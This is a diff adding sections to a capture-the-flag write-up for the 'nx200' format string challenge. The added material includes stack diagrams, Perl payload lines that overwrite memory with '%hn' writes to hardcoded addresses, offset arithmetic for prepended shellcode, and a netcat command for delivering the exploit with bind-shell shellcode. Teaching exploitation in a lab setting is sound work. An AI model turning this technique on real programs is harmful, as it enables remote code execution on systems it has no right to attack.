@@ -1,3 +1,11 @@
+nx200 Solution & Write-up by Leander Metcalf
+2015 - May - 27
+
+Guide: This write-up is designed to explain a lot. If you are only
+interested in how I created the format string exploit see Section 7.
+Otherwise check the contents below if you want to skip to certain
+sections of my write-up.
+
 Contents:
 1. The exploit in action
 2. Challenge Description
@@ -5,13 +13,19 @@ Contents:
 4. Tools Used During this Challenge
 5. Beating the Challenge
 6. Examining the Binary
-7. Writing the Format String
+7. Creating the Format String
+8. Using the exploit
 
+References:
+https://www.exploit-db.com/docs/28476.pdf
+http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/stack.html
+http://shell-storm.org/shellcode/
+Secure Coding in C and C++ By Robert C. Seacor
 
 
 1. The exploit in action:
 
-root@KaliBox:~# ./exploit.pl | nc -p 4222 0.0.0.0 9999
+root@KaliBox:~# ./nx200-exploit.pl | nc -p 4222 0.0.0.0 9999
 
 Welcome warrior.  What is your name?
 You wake up in a cave.  You have no recollection of how you got here. 
@@ -137,7 +151,7 @@ now lets make this visual because it will help us later:
 ++ 41414141 ++   <== The first argument in the stack we can influence
 ++++++++++++++
 
-7. Writing the Format String: Now we know we can write to the stack,
+7. Creating the Format String: Now we know we can write to the stack,
 the proper offset, and how to get the format string into snprintf (
 assuming you have already walked through the proper menu choices).
 Now the crafting of the format string. For simplicity I am removing
@@ -243,6 +257,30 @@ width field will be off now. This is done by subtracting 8 from 2052, because th
 		$lojack_spot="\x54\xb5\x04\x08";
 		print $lojack_spot . $hijack_spot . "%2044c%9\$hn%35795%8\$hn";
 		
+		Visually the stack will now look like this:
+		
+		++++++++++++++
+		++  Input   ++
+		++++++++++++++
+		++  args    ++
+		++++++++++++++        ***Without getting into too much detail,
+		++  lojack  ++        \x0804 will be written to the lojack spot
+		++++++++++++++        and \x93d7 will be written to the hijack
+		++  hijack  ++        spot. See the format string reference
+		++++++++++++++        for more details.
+		++   %204   ++
+		++++++++++++++
+		++   4c%9   ++
+		++++++++++++++
+		++   $hn%   ++
+		++++++++++++++
+		++   3579   ++
+		++++++++++++++
+		++   5%8$   ++
+		++++++++++++++
+		++   hn     ++
+		++++++++++++++
+		
 We now have two final steps in order to make the format string exploit. 1st we need 
 shellcode and then 2nd we need to adjust our format exploit again. For brevitiy, 
 let's say that our shellcode is 84 bytes long. That means we need to subtract another 
@@ -252,3 +290,50 @@ let's say that our shellcode is 84 bytes long. That means we need to subtract an
 		$hijack_spot="\x56\xb5\x04\x08";
 		$lojack_spot="\x54\xb5\x04\x08";
 		print $shellcode . $lojack_spot . $hijack_spot . "%1960c%9\$hn%35795%8\$hn";
+		
+Last, we have to adjust our offsets because lojack and hijack are no longer located
+at the 8 and 9 4-byte position offsets. Visually the stack will now look like this with 
+the shellcode.
+
+++++++++++++++
+++  4 bytes ++   <== beginning of format string is shellcode
+++++++++++++++
+++  4 bytes ++   <== More shellcode
+++++++++++++++
+++  4 bytes ++   <== More shellcode
+++++++++++++++
+
+... etc ... until
+
+++++++++++++++
+++  8$hn    ++   <== end of format string
+++++++++++++++
+++	args		++   !-- %x not so useful yet
+++++++++++++++
+++shellcode ++   <== The first argument in the stack we can influence,
+++++++++++++++       which happens to be shellcode ... 
+
+As a result we need to adjust the %9 and %8 to account for the shellcode. The best
+way to do this without having to count every 4 bytes of shellcode is to make sure
+that your shellcode is a multiple of 4. This way you can divide your shellcode by 4
+and then add the result to your offsets. 
+
+		Simple Math: 84 bytes of shellcode / 4 = 21, so now we add 21 to %9 and %8
+		
+		$shellcode="84 bytes of shellcode";
+		$hijack_spot="\x56\xb5\x04\x08";
+		$lojack_spot="\x54\xb5\x04\x08";
+		print $shellcode . $lojack_spot . $hijack_spot . "%1960c%30\$hn%35795%29\$hn";
+		
+8. Using the Exploit: All of my code was designed in PERL. However, PERL does not
+inherently have networking capabilities, so I pipe my PERL script through netcat.
+Additionally, you will need shellcode. One of the consideration you need to think
+about is how will you interact with the vulernable program across a network. Will
+the shellcode establish a listener or will it callback to your IP address and port?
+Will your own firewall or the vulnerable program's firewall stop you from accessing
+the listener or from receiving the callback? My own personal preference is to use
+shellcode which binds to a port you specifiy and then "dups" the received connection's
+file descriptor to your connected port. My command line to execute the exploit is
+as follows:
+
+		./nx200-exploit.pl | nc -p 4222 0.0.0.0 9999
